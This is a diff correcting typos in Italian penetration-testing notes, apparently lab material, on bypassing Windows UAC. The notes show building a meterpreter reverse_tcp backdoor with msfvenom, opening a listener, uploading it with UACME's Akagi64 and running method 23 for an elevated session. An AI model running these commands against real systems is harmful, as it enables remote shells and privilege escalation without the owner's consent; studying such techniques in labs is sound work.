@@ -153,7 +153,7 @@ COSA FAREMO
 2. Lo trasferiamo al target
 3. Usiamo l'akagai executable con la Key (metodo) numero 23
 4. Eseguiamo il meterpreter payload che dovrebbe bypassare l'UAC
-5. Ci verrà fornita una evelated meterpreter session sul nostro listener
+5. Ci verrà fornita una elevated meterpreter session sul nostro listener
 
 ### Generiamo il payload e apriamo un listener
 
@@ -162,7 +162,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > 
 //LHOST è il nostro IP attaccante
 ls
 msfconsole //apriamo una nuova sessione MSF per impostare un listneer
-use multi/hendler
+use multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST 10.10.5.2
 set LPORT 1234
@@ -190,7 +190,7 @@ upload backdoor.exe
 upload /root/Desktop/tools/UACME/Akagai64.exe
 shell
 dir
-.\Akagai64.exe 23 C:\Temp\backdoor.exe
+.\Akagi64.exe 23 C:\Temp\backdoor.exe
 ```
 
 <figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
